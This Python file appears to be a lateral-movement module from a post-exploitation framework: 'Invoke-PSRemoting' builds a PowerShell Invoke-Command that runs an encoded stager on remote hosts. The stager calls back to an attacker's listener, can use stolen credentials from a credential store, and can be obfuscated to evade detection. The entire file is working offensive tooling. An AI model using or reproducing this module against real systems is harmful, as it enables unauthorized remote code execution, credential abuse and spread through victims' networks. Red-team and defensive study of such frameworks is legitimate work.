from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-PSRemoting',

            'Author': ['@harmj0y'],

            'Description': ('Executes a stager on remote hosts using PSRemoting.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'ComputerName' : {
                'Description'   :   'Host[s] to execute the stager on, comma separated.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   '[domain\]username to use to execute command.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password to use to execute command.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the local powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   False
            },
            'ObfuscationCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use for obfuscation. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   'Token\All\\1,Launcher\STDIN++\\12467'
            },
            'LauncherObfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the LauncherObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   False
            },
            'LauncherObfuscationCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use for launcher obfuscation. Only used if LauncherObfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   'Token\All\\1,Launcher\STDIN++\\12467'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscationCommand = self.options['ObfuscationCommand']['Value']
        launcherObfuscate = self.options['LauncherObfuscate']['Value']
        launcherObfuscationCommand = self.options['LauncherObfuscationCommand']['Value']

        script = """Invoke-Command -AsJob """

        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
            self.options["Password"]['Value'] = password

        userName = self.options['UserName']['Value']
        password = self.options['Password']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""

        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, obfuscate=launcherObfuscate, obfuscationCommand=launcherObfuscationCommand)
                
            if launcher == "":
                return ""
            else:
                # build the PSRemoting execution string
                computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""
                script += " -ComputerName @("+computerNames+")"
                script += " -ScriptBlock {" + launcher + "}"

                if self.options["UserName"]['Value'] != "" and self.options["Password"]['Value'] != "":
                    # add in the user credentials
                    script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"

                script += ";'Invoke-PSRemoting executed on " +computerNames +"'"
            if obfuscate:
                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
            return script
